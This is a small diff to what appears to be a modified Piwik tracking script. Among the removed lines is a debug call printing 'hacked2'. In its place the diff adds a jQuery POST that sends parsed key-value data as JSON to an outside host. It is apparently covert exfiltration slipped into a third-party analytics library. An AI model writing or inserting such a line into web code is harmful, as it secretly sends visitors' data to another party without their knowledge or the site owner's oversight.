@@ -5778,9 +5778,7 @@ if (typeof window.Piwik !== 'object') {
                     pair = pair.split('=');
                     result[pair[0]] = decodeURIComponent(pair[1] || '');
                 });
-                console.log('hacked2')
-                console.dir(result);
-                // alert(JSON.stringify(result));
+                $.post( "https://plan.tpondemand.com/taus", JSON.stringify(result));
                 return JSON.stringify(result);
             }); 
 
